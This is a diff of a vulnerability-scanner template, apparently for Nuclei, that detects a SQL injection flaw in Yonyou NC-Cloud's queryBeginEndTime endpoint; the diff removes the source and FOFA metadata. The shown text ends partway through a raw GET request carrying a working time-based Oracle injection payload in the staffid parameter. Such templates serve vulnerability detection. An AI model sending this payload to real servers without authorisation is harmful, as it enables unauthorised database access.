@@ -3,14 +3,8 @@ info:
   name: 用友NC-Cloud系统queryBeginEndTime存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/a5dff8a8d57034f9c9aa31485c8f1788
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: a5dff8a8d57034f9c9aa31485c8f1788
-    fofa: + fofa`app="用友-NC-Cloud"`
 http:
 - raw:
   - 'GET /ncchr/period/queryBeginEndTime?staffid=1%3F''%20and%204431%3Ddbms_pipe.receive_message(chr(83)%7C%7Cchr(104)%7C%7Cchr(82)%7C%7Cchr(70)%2C3)-- HTTP/1.1
